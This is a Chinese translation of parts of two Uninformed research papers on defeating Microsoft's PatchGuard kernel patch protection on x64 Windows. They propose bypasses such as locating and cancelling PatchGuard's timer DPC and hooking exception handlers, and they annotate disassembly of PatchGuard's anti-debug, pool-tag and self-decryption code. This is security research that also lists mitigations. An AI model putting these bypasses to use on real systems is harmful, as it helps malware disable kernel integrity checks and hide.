一种未经测试的理论方法，可用于禁用 PatchGuard，它将涉及使用某种启发式算法（heuristic algorithm）来定位与 PatchGuard 关联的定时器上下文。要开发这样一种算法，有必要考虑关于定时器 DPC 例程如何设置的已知信息。首先，已知与该 DPC 关联的 DeferredRoutine 将指向 nt!KiScanReadyQueues、nt!ExpTimeRefreshDpcRoutine 或 nt!ExpTimeZoneDpcRoutine 之一。不幸的是，与这些例程关联的地址无法直接确定，因为它们未被导出，但尽管如此，这一知识可能有用。已知的第二件事是，与该 DPC 关联的 DeferredContext 将被设置为一个无效指针。还已知从定时器结构的开头偏移 0x88 处是字 0x1131。给予足够的研究，很可能还能找到与该定时器相关的其他上下文引用，能提供足够的数据来确定性地识别 PatchGuard 定时器。

然而，问题是首先要找到一种能枚举定时器的方法。在这种情况下，未导出的定时器列表地址必须被提取出来，以便能枚举所有活动定时器。虽然有一些间接方法可以提取这些信息，例如通过反汇编引用它的某些函数，但仅仅是依赖某种定位未导出符号的方法这一事实，就很可能导致代码不稳定。

另一种不需要定位未导出符号的选择是，找到某种机制，可以从 nt!MmNonPagedPoolStart 开始搜索地址空间，使用上述启发式匹配要求。给定一组正确的搜索参数，看起来很有可能能够可靠且确定性地定位定时器结构。然而，在这种模型下，肯定有一个竞态条件在等待发生，因为定时器例程可以在定位到它之后、但在取消它之前立即被分发。为了克服这一点，进行搜索的线程需要在做搜索时提高到一个更高的 IRQL，并可能禁用其他处理器。

无论如何，给定定位定时器结构的能力，事情应该简单到只需调用 nt!KeCancelTimer 就能中止 PatchGuard 校验例程并完全禁用它。如果可能，这样一种方法将非常理想，因为它不需要对代码打任何补丁。

如果这样一种技术被证实可行，微软将不得不做两件事中的一件来破坏它。首先，他们可以识别驱动程序正在使用的匹配标准，并确保所做的假设不再安全，从而使得使用现有的一组匹配参数定位定时器结构成为不可能。或者，微软可以改变 PatchGuard 校验例程被执行的机制，使其不使用定时器 DPC 例程。后者很可能不如前者受欢迎，因为它将需要相对重大的重新设计，并重新考虑用于误导和混淆 PatchGuard 校验阶段的技术。

#### 4.4) Hybrid Interception / 混合拦截

在迄今列出的技术中，用于禁用或以其他方式阻止 PatchGuard 正常运作的方法依赖于两个基本的拦截点。在异常处理程序挂钩方法的情况下，PatchGuard 是通过阻止实际校验例程运行而被颠覆的。这个拦截点可以被看作一种事前（before-the-fact）的方法。在 nt!KeBugCheckEx 挂钩的情况下，PatchGuard 是通过阻止报告与检测到关键结构修改相关的错误而被颠覆的。这个拦截点可以被看作一种事后（after-the-fact）的方法。一种理论方法是将这两个概念结合起来，以一种允许对 PatchGuard 校验例程的执行进行更确定、更完整检测的方式。

这种方法的一个可能例子是，把对与 PatchGuard 使用的定时器 DPC 例程关联的异常处理程序的挂钩，推广到 C 风格异常的中央入口点。这个例程名为 nt!__C_specific_handler，它是一个导出的符号，这使它如果能被利用就相当有用。通过挂钩这个例程，可以跟踪关于异常的信息，并按需要用事后信息对它进行过滤，以确定 PatchGuard 正在运行。

#### 4.5) Simulated Hot Patching / 模拟热补丁

与 PatchGuard 关联的文档指出，它仍允许通过其运行时补丁 API 对操作系统进行热补丁。出于这个原因，应该有可能模拟一个热补丁，使它在 PatchGuard 看来像是合法的。在本文写作时，作者还没有花时间去理解这如何能做到，但它留待进一步研究。假设找到了一种能让这种技术可靠工作的方法，那么顺理成章地，这样做将是最受欢迎的路线，因为它将是利用一种有文档记载的方法来规避 PatchGuard。

### 5) Conclusion / 结论

开发一个旨在缓解对内核各关键部分未经授权修改的解决方案，可以被看作一项相当令人生畏的任务，尤其是在还要考虑确保实际用于校验内核的例程本身不能被篡改这一需求时。本文展示了微软如何用他们在基于 x64 的 Windows 内核版本上的 PatchGuard 实现来处理这个问题。用于保护与内核关联的各种关键数据结构（如系统映像、SSDT、IDT/GDT 和 MSR）的方法的实现，已经被详细解释了。

在理解了 PatchGuard 的实现之后，考虑它可能被颠覆的方式是恰如其分的。从这个角度看，本文提出了几种可用于绕过 PatchGuard 的不同技术，它们要么已被证明有效，要么被理论上认为有效。出于不只指出问题而不提出解决方案的考虑，每种绕过技术都附带了一份清单，列出微软在将来可以缓解该技术的方式。

不幸的是，微软在 PatchGuard 上处于劣势，而且他们非常清楚这一点。这种劣势源于这样一个事实：PatchGuard 被设计为从与它所要防备的代码相同的保护域（protection domain）中运行。用更简洁的话说，PatchGuard 就像任何第三方驱动一样运行，并以同一组特权运行。由于这一事实，不可能保证第三方驱动不会做某些事情来阻止 PatchGuard 完成其工作，因为 PatchGuard 没有办法完全保护自己。由于这个问题在 PatchGuard 实现之初就已知晓，微软选择使用他们手边唯一现成的武器：混淆和误导。虽然大多数人认为，在面对一个足够有动力的工程师时，以隐蔽求安全根本算不上安全，但它确实把门槛抬高到了足以让大多数程序员和第三方实体不会有兴趣去寻找绕过它的方法、而是更有动力去寻找一种被认可的方法来实现其目标的程度。

在像这样的情况下，有时重要的是退后一步，考虑所走的这条道路是否真的是正确的道路。特别是，微软已决定采取一种激进的立场，反对对内核不同部分打补丁，以使 Windows 更稳定。虽然这一愿望看起来非常合理和合乎逻辑，但它是有一定代价的。由于 Windows 是一个闭源操作系统这一事实，第三方软件厂商有时发现自己被迫去变通规则，以实现其产品的目标。在安全行业尤其如此，那里的安全软件厂商发现自己不得不试图比恶意代码扎得更深。可以争辩说，PatchGuard 的实现将使恶意技术成为不可能，从而让安全软件厂商解放到更合理的入口点。然而，事实是，虽然安全软件厂商出于营销和安全考虑可能不会使用用于绕过 PatchGuard 的技术，但可以肯定地说恶意代码会。这样一来，恶意代码实际上在竞争中获得了上风，因为安全厂商最终双手被绑在背后。为了解决这一担忧，微软似乎愿意积极与厂商合作，以确保他们仍能通过更可接受和有文档记载的方法实现其目标。

另一个要考虑的重要问题是，微软是否真的会去破坏一个已经向数百万系统部署了解决方案、而该方案恰好通过一种绕过技术禁用 PatchGuard 的厂商。人们完全可以想象 McAfee 或 Symantec 做这样的事，尽管微软会希望利用他们的商业关系来确保 McAfee 和 Symantec 不必诉诸这种技术。McAfee 和 Symantec 是如此大的公司这一事实，在与微软谈判时给了他们一定程度的筹码，但较小的公司很可能不会受到同等程度的尊重和考虑。

然而，问题仍然存在。PatchGuard 真的是正确的方法吗？如果人们假设微软将积极确保 PatchGuard 破坏恶意代码和试图绕过它的软件厂商——通过在将来发布故意破坏这些绕过方法的更新，这正是迄今为止所表明的——那么顺理成章地，微软可能正走在一条导致内核实际上变得更不稳定的道路上，因为将需要更极端的措施。即使微软向其他公司伸出手，提供在各个层级挂钩进内核的方法，也很可能总是会出现一家公司需要完成的某个任务，在没有微软干预的情况下无法轻易做到。除非微软愿意向这些公司提供可再分发的代码，使第三方驱动能在所有现有的 x64 版本上工作，否则这一点就没有意义。兼容性不仅对微软、而且对第三方厂商都是一个关键要求，而一个不能在所有 x64 内核版本上工作的解决方案，对大多数公司而言根本算不上解决方案。

如果微软能回到过去消除 PatchGuard，还有哪些其他选择可能摆在他们面前，可用于补充手头的问题？对这个问题的回答非常主观，但作者认为，微软至少可以部分解决这一问题的一种方式，是通过一个定义更好且被认可的挂钩模型（就像在 Windows 9x 中挂钩 VxD 服务那样）。被合法产品挂钩的大多数例程，被厂商用来在某些主要子系统之间分层，例如在硬件与内核之间，或在用户模式与内核之间。由于第三方厂商用运行时补丁引入的大多数稳定性问题，都与他们挂钩例程中不正确或不安全的假设有关，微软理应提供一个定义好的挂钩模型，阐明每个可被挂钩函数相关的限制和约束。虽然这看起来像一项宏大的工程，但事实是它并非如此。

通过将挂钩模型限制在导出的例程上，微软可以利用现有的文档，这些文档定义了有文档记载函数的行为和限制，例如它们的 IRQL 和调用限制。虽然将挂钩模型限制在导出函数上并不能涵盖一切，但它至少是一个开始，而用于实现它的概念可以被包装成一个对常用的未记载或未导出例程同样有用的接口。然而，这种方法最大的问题是，它看起来会限制微软对内核发展方向的控制，而且在某些方面它确实如此。然而，应当已经可以安全地假设，导出的符号，至少就已记载的而言，在发布之后不能被消除或大幅改变，以确保向后兼容性。这只会加强这样一个论点：一个针对有文档记载的导出例程的、定义好的挂钩模型，不仅可行，而且相对安全。

无论哪种方法本可能更好，缺乏时间机器使得这场讨论的最终结果大多毫无意义。最后，从投入到 PatchGuard 实现中的工作量和思考来判断，作者可以安心地说，微软做了一份值得称赞的工作。PatchGuard 究竟有多有效，无论是在软件层面还是商业层面，只有时间能证明，而观察这一领域如何演变将是有趣的。

### References / 参考文献

（以下为原文文末参考文献，书目信息保持原文。）

AMD. The AMD x86-64 Architecture Programmers Overview.
http://www.amd.com/us-en/assets/contenttype/whitepapersandtechdocs/x86-64overview.pdf；
accessed Nov 30, 2005（访问于 2005 年 11 月 30 日）。

AMD. AMD64 Architecture Programmer's Manual Volume 3.
http://www.amd.com/us-en/assets/content_type/white_papers_and_tech_docs/24594.pdf；
accessed Dec 1, 2005（访问于 2005 年 12 月 1 日）。

Microsoft Corporation. Patching Policy for x64-Based Systems.
http://www.microsoft.com/whdc/driver/kernel/64bitPatching.mspx；
accessed Nov 28, 2005（访问于 2005 年 11 月 28 日）。

## 附录三：原始论文全译二——Subverting PatchGuard Version 2（Uninformed 第 6 卷，Skywing，2006）

## 颠覆 PatchGuard 第二版（Subverting PatchGuard Version 2）

> **译者注**
>
> - 出处：Uninformed Vol 6（《Uninformed》第 6 卷）
> - 作者：Skywing
> - 日期：2006 年 12 月
> - 原文链接：http://www.uninformed.org/?v=6&a=1&t=txt
> - 本文为该论文的全文翻译，覆盖原文全部内容：第 1–7 章（前言、引言、值得注意的保护机制、绕过技术、策反 PatchGuard、未来方向、结论）及参考文献。
> - 翻译原则：全文翻译，不删节、不摘要化；代码块、汇编、函数名、数值、常量保持原文原样，代码内注释译为中文；正文专有名词首次出现时给出简短中文说明。
>
> 原文题头信息：
>
> Subverting PatchGuard Version 2
> Skywing
> 12/2006
> skywing@valhallalegends.com
> http://www.nynaeve.net

### 1) 前言（Foreword）

摘要（Abstract）：Windows Vista x64 以及最近打过热修复补丁的 Windows Server 2003 x64 内核版本，包含微软的内核模式补丁防护技术——即众所周知的 PatchGuard（内核补丁防护，一种阻止第三方未经授权修改内核代码与关键数据结构的技术）——的一个更新版本。这个新版本的 PatchGuard 在若干方面改进了先前的版本，主要涉及的是：从一个部署会给内核打补丁的驱动程序的独立软件供应商（ISV，Independent Software Vendor，独立软件供应商）的视角出发，设法提高绕过 PatchGuard 的难度。PatchGuard 第二版的功能集在其他方面与 PatchGuard 第一版相当相似；SSDT（System Service Descriptor Table，系统服务描述符表，内核中存放系统服务函数指针的表）、IDT/GDT（Interrupt Descriptor Table / Global Descriptor Table，中断描述符表／全局描述符表）、各种 MSR（Model Specific Register，型号专用寄存器，处理器特有的控制寄存器），以及若干内核全局函数指针变量（还有内核代码本身），都被保护起来，防止未经授权的修改。本文提出了若干可以用来彻底绕过 PatchGuard 第二版的方法。本文还提出了针对这些绕过技术的潜在解决方案。此外，本文描述了一种机制，借助它可以颠覆 PatchGuard 第二版，让它运行自定义代码来代替 PatchGuard 的系统完整性检查代码，而且在 PatchGuard 被颠覆之后，系统中不留下任何内核补丁或已加载的自定义内核驱动程序的痕迹。这一点从利用 PatchGuard 自身的防御来隐藏内核模式代码这一视角来看尤其有意思，而这一目标（在许多方面）与 PatchGuard 的设计初衷完全背道而驰。

致谢（Thanks）：作者想要感谢 skape、bugcheck 和 Alex Ionescu。

免责声明（Disclaimer）：本文的发表是出于教育以及增进公众一般知识的目的。对于本文所披露信息的任何潜在使用（或误用），作者不承担责任。尽管作者已经尽可能地警惕，以确保本文准确无误，但仍有可能残留一处或多处错误。如果发现了这样一处不准确或错误，作者将非常感谢能得到通知，以便做出适当的更正。

### 2) 引言（Introduction）

在 Windows 内核的 x64 版本上，微软试图采取一种激进的立场[1]，反对使用某一类技术——这类技术在先前版本的 Windows 上曾被频繁用来以潜在不安全的方式「扩展」内核。这包括给内核本身打补丁、钩住（hook，挂钩，即拦截并改道函数调用）内核的系统服务表、重定向中断处理程序，以及其他几种不太常见、在内核被触及之前拦截执行控制权的技术，例如篡改系统调用目标 MSR（即决定系统调用入口的型号专用寄存器）。

微软为阻止历史上在 x86 上猖獗的、未经授权的内核补丁而部署的技术，就称为 PatchGuard。这项技术最初随 Windows Server 2003 x64 Edition 和 Windows XP x64 Edition 一同发布（即众所周知的 PatchGuard 第一版）。Windows Vista 的 x64 版本，以及最近打过热修复补丁的 Windows Server 2003 x64 内核版本，包含一个较新版本的 PatchGuard 技术，即众所周知的 PatchGuard 第二版。新版本的设计目的是，让独立软件供应商（ISV）在禁用 PatchGuard 所提供的内核补丁防护机制之后，在实际部署环境中部署涉及给内核打补丁的解决方案，变得显著更加困难。PatchGuard 本身的内部细节与 PatchGuard 第一版时大体相同，因此本文不会详细讨论它们（第二版改进的反调试与反补丁技术除外）。足够有兴趣、希望了解该主题更多背景信息的读者，可以在 Uninformed 先前关于该主题的文章[2]《在 Windows x64 上绕过 PatchGuard》（"Bypassing PatchGuard on Windows x64"）中找到关于 PatchGuard 第一版如何运作的更多内容。

PatchGuard 第二版以最初的 PatchGuard 发布版为基础，试图堵住其基于混淆（obfuscation，即故意使代码与数据难以理解和分析）的反补丁系统在实现上的各种漏洞。在这一方面，它取得了一些成败参半的结果。尽管新的 PatchGuard 版本在表面上看起来确实禁用了先前所提出的[2]、用作禁用最初 PatchGuard 发布版的手段的大多数绕过技术，但这些技术中至少有好几种，只需做一些微小的改动或增加一些新的代码，就可以相当轻易地重新启用。此外，绕过 PatchGuard 第二版仍然是可能的，且无需依赖危险的（与具体版本绑定的）构造，例如硬编码的偏移量或对频繁变化的代码做代码指纹识别（code fingerprinting，即通过特征字节模式识别代码）。另外，除了基于禁用 PatchGuard 本身的技术之外，仍然存在若干潜在的绕过机制，它们很有潜力做到与未来的 PatchGuard 新版本「向前兼容」——这是凭借阻止 PatchGuard 甚至察觉到内核已被做了未经授权的篡改来实现的（从而使它们自身与 PatchGuard 系统完整性检查被调用方式上的、任何基于混淆的变化隔离开来）。不过，应当肯定微软的是，PatchGuard 抵抗被调试和分析的能力已经得到了显著提高（至少就某些关键步骤而言是如此，例如开机时的初始化）。

### 3) 值得注意的保护机制（Notable Protection Mechanisms）

PatchGuard 第二版实现了一系列值得介绍的反调试、反分析和混淆机制。PatchGuard 的防御并非全部都在本文中详细涵盖；而那些（例如 PatchGuard 内部数据结构的混淆）在原理上至少与先前的 PatchGuard 发布版相同的机制（且已由 Uninformed 先前关于 PatchGuard 的文章[2]披露过），本文同样不予涵盖。

#### 3.1) 初始化期间的反调试代码（Anti-Debug Code During Initialization）

话虽如此，就 PatchGuard 的保护机制而言，仍然有许多有意思的东西值得考察。这些技术中有许多单凭自身就值得讨论，仅仅从它们作为通用调试／分析防护机制的价值这一视角来看就是如此。PatchGuard 第二版始于内核中 nt!SepAdtInitializePrivilegeAuditing 例程（routine，即函数／例程）的一段附加增补（PatchGuard 第二版延续了 PatchGuard 第一版引入的、使用误导性和／或虚假函数名的伎俩）。这个例程负责执行 PatchGuard 初始化的大部分工作，包括建立加密后的 PatchGuard 上下文（context，此处指保存 PatchGuard 状态的数据结构）数据结构。与 PatchGuard 第一版不同，这个初始化例程中散布着许多意在挫败调试的语句，例如下面这个构造：如果有调试器连接，它就会进入一个无限循环（这个特定的构造在 PatchGuard 初始化期间的许多地方都被使用）：

```
cli
cmp     cs:KdDebuggerNotPresent, r12b
jnz     short continue_initialization_1
infinite_loop_1:
jmp     short infinite_loop_1
sti
```

就 PatchGuard 第二版目前的实现而言，这种特定的做法并不那么健壮。提前检测出这些对 nt!KdDebuggerNotPresent（内核变量，指示内核调试器是否不存在）的引用并将其禁用，仍然相对容易。如果微软当初选择在每一次出现这种构造时，都以一种有创意的方式破坏执行上下文（例如把某些寄存器清零，或者以其他方式安排成：如果有调试器附加，就会过很久之后才发生一次失败），然后才进入死循环，那么这些构造作为反调试手段，本来可能会稍微有效一些。

其他构造包括：高度混淆地选择一随机集合的虚假池标签（pool tag，内核池分配时附带的四字节标识，用于追踪内存来源），用于分配 PatchGuard 数据结构。与 PatchGuard 第一版一样，PatchGuard 第二版使用一个随机选出的虚假池标签和随机调整过的分配大小，试图通过扫描池分配来轻易检测内存中的 PatchGuard 上下文的做法变得困难。下面是 PatchGuard 用来从一份可能的池标签列表中随机挑选一个池标签和一个随机分配增量的代码段之一的例子。实际的分配大小是随机分配增量加上 PatchGuard 上下文结构的最小大小，并截断在 2048 字节处。这里，rdtsc 指令（读取时间戳计数器的指令）被用于随机数生成的目的（已经看过先前[2] PatchGuard 论文的读者可能会认出这个随机数生成构造；只要 PatchGuard 中任何地方需要一个随机量，就会用到它）。

```
;
; 生成一个随机值，使用 rdtsc。
; （原文：Generate a random value, using rdtsc.）
;
lea     ebx, [r14+r13+200h]
mov     dword ptr [rsp+0A28h+Timer], ebx
rdtsc
mov     r10, qword ptr [rsp+0A28h+arg_5F8]
shl     rdx, 20h
mov     r11, 7010008004002001h
or      rax, rdx
mov     rcx, r10
xor     rcx, rax
lea     rax, [rsp+0A28h+var_2C8]
xor     rcx, rax
mov     rax, rcx
ror     rax, 3
xor     rcx, rax
mov     rax, r11
mul     rcx
mov     [rsp+0A28h+var_2C8], rax
xor     eax, edx
mov     [rsp+0A28h+arg_1F0], rdx
;
; 这本质上是一个 switch(eax & 7)，其中 eax
; 是一个随机值。每个 case 语句选择
; 一个唯一的、经过混淆的池标签值。那个神奇的
; 下面的 0x432E10h 常量，是用来
; 跳转到所选 switch case 处理程序的偏移量。
; （原文：This is essentially a switch(eax & 7), where eax
; is a random value.  Each case statement selects
; a unique obfuscated pooltag value.  The magical
; 0x432E10h constant below is the offset used to
; jump to the switch case handler selected.）
;
lea     rdx, cs:400000h
and     eax, 7
mov     ecx, [rdx+rax*4+432E10h]
add     rcx, rdx
jmp     rcx
--------------------------------------------------
mov     dword ptr [rsp+0A28h+var_9D8], 0D098D0D8h
mov     r9d, dword ptr [rsp+0A28h+var_9D8]
ror     r9d, 6
jmp     DoAllocation
--------------------------------------------------
mov     dword ptr [rsp+0A28h+var_9D8], 0B2AD31A1h
mov     r9d, dword ptr [rsp+0A28h+var_9D8]
rol     r9d, 1
jmp     DoAllocation
--------------------------------------------------
mov     dword ptr [rsp+0A28h+var_9D8], 85B5910Dh
mov     r9d, dword ptr [rsp+0A28h+var_9D8]
ror     r9d, 2
jmp     DoAllocation
--------------------------------------------------
mov     dword ptr [rsp+0A28h+var_9D8], 0A8223938h
mov     r9d, dword ptr [rsp+0A28h+var_9D8]
xor     r9d, 3
ror     r9d, 0Fh
jmp     DoAllocation
--------------------------------------------------
mov     dword ptr [rsp+0A28h+var_9D8], 67076494h
mov     r9d, dword ptr [rsp+0A28h+var_9D8]
rol     r9d, 4
jmp     DoAllocation
--------------------------------------------------
mov     dword ptr [rsp+0A28h+var_9D8], 288C49EDh
mov     r9d, dword ptr [rsp+0A28h+var_9D8]
ror     r9d, 5
jmp     DoAllocation
--------------------------------------------------
mov     dword ptr [rsp+0A28h+var_9D8], 4E574672h
mov     r9d, dword ptr [rsp+0A28h+var_9D8]
xor     r9d, 6
ror     r9d, 18h
jmp     DoAllocation
--------------------------------------------------
DoAllocation:
;
; 再取得另一个随机值（用于分配大小），
; 并对已选出的池标签值做去混淆。
;
; 最终，落入 "r9d" 的值会被用作
; 池标签值。
; （原文：Get another random value (for the allocation size),
; and deobfuscate the pooltag value that was selected.
;
; Eventually, the value ending up in "r9d" is used as
; the pooltag value.）
;
rdtsc
shl     rdx, 20h
mov     rcx, r10
or      rax, rdx
xor     rcx, rax
lea     rax, [rsp+0A28h+var_858]
xor     rcx, rax
mov     rax, rcx
ror     rax, 3
xor     rcx, rax
mov     rax, r11
mul     rcx
mov     [rsp+0A28h+ValueName], rdx
mov     r9, rax
mov     [rsp+0A28h+var_858], rax
xor     r9d, edx
mov     eax, 4EC4EC4Fh
mov     ecx, r9d
mul     r9d
shr     edx, 3
shr     r9d, 5
mov     r8d, r9d
mov     eax, 4EC4EC4Fh
imul    edx, 1Ah
sub     ecx, edx
add     ecx, 61h
shl     ecx, 8
mul     r9d
shr     edx, 3
shr     r9d, 5
mov     eax, 4EC4EC4Fh
imul    edx, 1Ah
sub     r8d, edx
mul     r9d
add     r8d, 41h
mov     eax, 4EC4EC4Fh
or      r8d, ecx
shr     edx, 3
mov     ecx, r9d
shr     r9d, 5
shl     r8d, 8
imul    edx, 1Ah
sub     ecx, edx
add     ecx, 61h
or      ecx, r8d
shl     ecx, 8
mul     r9d
shr     edx, 3
imul    edx, 1Ah
sub     r9d, edx
add     r9d, 41h
or      r9d, ecx
rdtsc
shl     rdx, 20h
mov     rcx, r10
mov     r8d, r9d        ; Tag
or      rax, rdx
xor     rcx, rax
lea     rax, [rsp+0A28h+var_2E8]
xor     rcx, rax
mov     rax, rcx
ror     rax, 3
xor     rcx, rax
mov     rax, r11
mul     rcx
;
; 执行实际的分配。我们请求的是 NonPagedPool（非分页池），
; 使用上面去混淆与随机化代码所选出的随机池标签。
; 这里被分配的块的实际大小在 ebx 中给出，
; 并带有一个随机的「模糊因子」，它会被加到
; 这个最小分配大小上，然后截断到
; 最大 2047 字节。
; （原文：Perform the actual allocation.  We're requesting NonPagedPool,
; with the random pooltag selected by the deobfuscation and
; randomization code above.  The actual size of the block being
; allocated here is given in ebx, with a random "fuzz factor" that
; is added to this minimum allocation size, then truncated to a
; maximum of 2047 bytes.）
;
xor     ecx, ecx        ; PoolType
mov     [rsp+0A28h+var_310], rdx
xor     rdx, rax
mov     [rsp+0A28h+var_2E8], rax
and     edx, 7FFh
add     edx, ebx        ; NumberOfBytes
call    ExAllocatePoolWithTag
```

### 3.2) Expanded Set of DPC Routines / 扩充的 DPC 例程集合

PatchGuard 第 2 版中使用的其他保护机制，包括一套得到扩充的 DPC 例程集合，用于安排 PatchGuard 完整性检查例程的执行。DPC（Deferred Procedure Call，延迟过程调用）是 Windows 内核把工作推迟到较低中断请求级执行的机制，此处被 PatchGuard 借用来定时触发检查。回顾一下，在 PatchGuard 第 1 版中，存在一组三个可能的 DPC 例程。在 PatchGuard 第 2 版中，这组可被 PatchGuard 征用的潜在 DPC 例程，已经扩充到十种可能。启动时从这十种可能中选出一个 DPC 例程，从那一刻起，它便在会话的整个生命周期内被用于所有后续的 PatchGuard 操作。某一次特定的 Windows 会话中只使用一个 DPC 例程，这一点是沿袭自上一版 PatchGuard 的弱点（读者将会发现，如果有人决心绕过 PatchGuard，这一点最终会派上用场）。当前启动会话要使用的 DPC 例程，是在 nt!SepAdtInitializePrivilegeAuditing 例程中选出的，其方式与选出要用于所有 PatchGuard 分配的虚假池标签（pooltag，即内存池分配时附带的四字符标识，用于标记分配来源）大同小异：

```
INIT:0000000000832741:
PatchGuard_Pick_Random_DPC:
;
; Use the time stamp counter as a random seed.
;
rdtsc
shl     rdx, 20h
mov     rcx, r15
or      rax, rdx
xor     rcx, rax
lea     rax, [rsp+0A28h+var_360]
xor     rcx, rax
mov     rax, rcx
ror     rax, 3
xor     rcx, rax
mov     rax, 7010008004002001h
mul     rcx
mov     [rsp+0A28h+var_360], rax
mov     rcx, rdx
mov     qword ptr [rsp+0A28h+arg_260], rdx
xor     rcx, rax
mov     rax, 0CCCCCCCCCCCCCCCDh
mul     rcx
shr     rdx, 3
;
; The resulting value in `rax' is the index into a switch jump table
; that is used to locate the DPC to be repurposed for initiating
; PatchGuard checks for this session.
;
lea     rax, [rdx+rdx*4]
add     rax, rax
sub     rcx, rax
jmp     PatchGuard_DPC_Switch

INIT:0000000000832317:
PatchGuard_DPC_Switch:
;
; The address of the case statement is formed by adding the image base (here,
; being loaded into `rdx') and an RVA in the table indexed by rax.
;
lea     rdx, cs:400000h
mov     eax, ecx
;
; Locate the case statement RVA by indexing the jump offset table.
;
mov     ecx, [rdx+rax*4+432E60h]
;
; Add it to the image base to form a complete 64-bit address.
;
add     rcx, rdx
;
; Execute the case handler.
;
jmp     rcx
```

上面第一段代码用时间戳计数器（rdtsc 读到的计数）作随机种子，经过一系列异或、移位与乘法运算，算出一个索引值；第二段代码则以该索引查跳转偏移表，把镜像基址与表中的 RVA（Relative Virtual Address，相对虚拟地址，即相对于镜像基址的偏移）相加，形成完整的 64 位地址，再跳去执行对应的分支处理代码。

```
;
; The set of case statements are as follows:
;
; Each case statement block simply loads the full 64-bit address
; of the DPC routine to be repurposed for PatchGuard checks into
; the r8 register.  This register is later stored into one of
; PatchGuard's internal data structures for future use.
;

lea     r8, CmpEnableLazyFlushDpcRoutine
jmp     short PatchGuardSelectDpcRoutine
lea     r8, _CmpLazyFlushDpcRoutine
jmp     short PatchGuardSelectDpcRoutine
lea     r8, ExpTimeRefreshDpcRoutine
jmp     short PatchGuardSelectDpcRoutine
lea     r8, ExpTimeZoneDpcRoutine
jmp     short PatchGuardSelectDpcRoutine
lea     r8, ExpCenturyDpcRoutine
jmp     short PatchGuardSelectDpcRoutine
lea     r8, ExpTimerDpcRoutine
jmp     short PatchGuardSelectDpcRoutine
lea     r8, IopTimerDispatch
jmp     short PatchGuardSelectDpcRoutine
lea     r8, IopIrpStackProfilerTimer
jmp     short PatchGuardSelectDpcRoutine
lea     r8, KiScanReadyQueues
jmp     short PatchGuardSelectDpcRoutine
lea     r8, PopThermalZoneDpc
;
; (fallthrough from last case statement)
;
INIT:0000000000832800:
PatchGuardSelectDpcRoutine:
xor     ecx, ecx
;
; Store the DPC routine into r14+178.  r14 points to one of
; the PatchGuard context structures in this particular instance.
;
mov     [r14+178h], r8
```

上述各分支语句块所做的事很简单：每一个都只是把要被征用于 PatchGuard 检查的那个 DPC 例程的完整 64 位地址装入 r8 寄存器；该寄存器随后会被存入 PatchGuard 的某个内部数据结构，供日后使用。最后一个分支没有跳转，而是直接顺落（fallthrough）到 PatchGuardSelectDpcRoutine，把选定的 DPC 例程地址存入 r14+178h 处——在此处，r14 指向 PatchGuard 的某个上下文结构。

与 PatchGuard 第 1 版很相似，被选中用来启动 PatchGuard 完整性检查的每一个 DPC，本身都有正当的功能。此外，这些 DPC 例程对系统的正常运转都很重要，因此，不可能简单地把所有指向这些 DPC 例程的 DPC 都找出来并取消掉。相反，与 PatchGuard 第 1 版大体相同，如果有人想走封堵 PatchGuard 的 DPC 这条路，就必须开发一种机制，来识别出那个特定的 PatchGuard DPC（而不是这些 DPC 例程的合法系统调用）。PatchGuard 的这一方面混淆机制与第 1 版相对相似，区别只在于逻辑上从三个 DPC 扩展到了十个 DPC。

### 3.3) Self-Decrypting and Mutating System Integrity Check Routine / 自解密且可变异的系统完整性检查例程

PatchGuard 第 2 版还从第 1 版继承了在内存中加密其数据结构和可执行代码的能力。这是一种防御机制，意在让攻击者难以实施经典的“找蛋”（egghunt）式搜索——在这种搜索中，攻击者已经为 PatchGuard 数据结构设计出一种可识别的特征签名（signature，可用于匹配识别目标的字节模式），可以用它在穷举式的非分页池（non-paged pool，始终驻留在物理内存、不会被换出到磁盘的内核内存池）内存扫描中定位 PatchGuard。从这个角度看，对动态分配的 PatchGuard 代码和数据结构进行混淆与加密，仍然是一种相当有力的防御机制。然而，对微软来说不幸的是，一些链接到 PatchGuard 的数据结构是系统内部结构（例如用于启动 PatchGuard 执行的一个 KDPC 及其关联的 KTIMER）。这就构成了一个弱点，有可能被用来在内存中识别 PatchGuard 结构（这一点将在后面更详细地探讨）。

PatchGuard 内部上下文结构的加密，已由 Uninformed 关于这一主题的原始论文 [2] 论述过。然而，PatchGuard 混淆其系统完整性检查与验证例程的机制，当时并未讨论。这一机制足够新颖，值得作一番解释。用来在内存中混淆 PatchGuard 可执行代码的技术，涉及两层解密／去混淆函数，每一层都解密下一层。两层都运行完毕之后，PatchGuard 的验证例程在内存中便是明文，随后被直接执行。

第一层解密层，是从启动时被 PatchGuard 选中的那个被征用的 DPC 例程中调用的代码块。它的任务是解密自身（以 8 字节为一块，从该函数的第二条指令开始）。这个代码块的解密完成之后，解密桩（decryption stub，即专门负责解密的一小段代码）接着去解密第二个代码块（真正的 PatchGuard 验证例程）。当这第二次解密／去混淆循环完成时，解密桩随后执行真正的 PatchGuard 系统完整性检查例程。

如上所述，解密桩的第一个任务是解密它自己。除该桩的第一条指令外，整个例程在进入时都是加密的。第一条指令把自身加密、并解密下一条指令。接下来的指令解密再后面的两条指令，如此继续下去。这是通过一系列四字节长的指令完成的：它们把一个八字节的量与一个解密密钥做异或（xor）运算（初始时从当前指令指针开始——此处，rcx 与 rip 始终具有相同的值）。下面举例说明这一过程如何工作：

```
;
; rcx: Address of the decryption stub (same as rip)
; rdx: Decryption key
;
Breakpoint 5 hit
nt!ExpTimeRefreshDpcRoutine+0x20a:
fffff800`0112c98b ff5538          call    qword ptr [rbp+38h]
0: kd> u poi(rbp+38)
;
; Note that beyond the first instruction, the decryption stub is initially seemingly
; garbage data (though it has an apparent pattern to it, since it is merely obfuscated
; by xor).
;
fffffadf`f6e6d55d f0483111        lock xor qword ptr [rcx],rdx
fffffadf`f6e6d561 88644d68        mov     byte ptr [rbp+rcx*2+68h],ah
fffffadf`f6e6d565 62              ???
fffffadf`f6e6d566 d257df          rcl     byte ptr [rdi-21h],cl
fffffadf`f6e6d569 88644d78        mov     byte ptr [rbp+rcx*2+78h],ah
fffffadf`f6e6d56d 62              ???
fffffadf`f6e6d56e d257ef          rcl     byte ptr [rdi-11h],cl
fffffadf`f6e6d571 88644d48        mov     byte ptr [rbp+rcx*2+48h],ah
0: kd> t
fffffadf`f6e6d55d f0483111        lock xor qword ptr [rcx],rdx
0: kd> r
;
; Note the initial input arguments.  rcx points to the decryption stub's first
; instruction (same as rip), and rdx is the decryption key.
;
rax=fffffadff6e6d55d rbx=fffff8000116d894 rcx=fffffadff6e6d55d
rdx=601c55c0cf06e32a rsi=fffff800003c7ad0 rdi=0000000000000003
